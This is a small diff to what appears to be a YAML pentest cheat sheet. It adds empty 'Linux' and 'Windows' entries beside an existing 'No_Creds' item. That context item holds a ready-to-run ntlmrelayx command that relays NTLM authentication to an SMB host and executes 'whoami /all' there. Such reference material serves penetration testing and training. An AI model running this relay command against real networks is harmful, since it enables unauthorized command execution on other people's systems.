@@ -12,4 +12,10 @@ items:
   No_Creds:
     - code: |
         python3 ntlmrelayx.py -smb2support -t smb://10.10.10.1 -c 'whoami /all' -debug
+  Linux:
+    - code: |
+        empty
+  Windows:
+    - code: |
+        empty
 ---
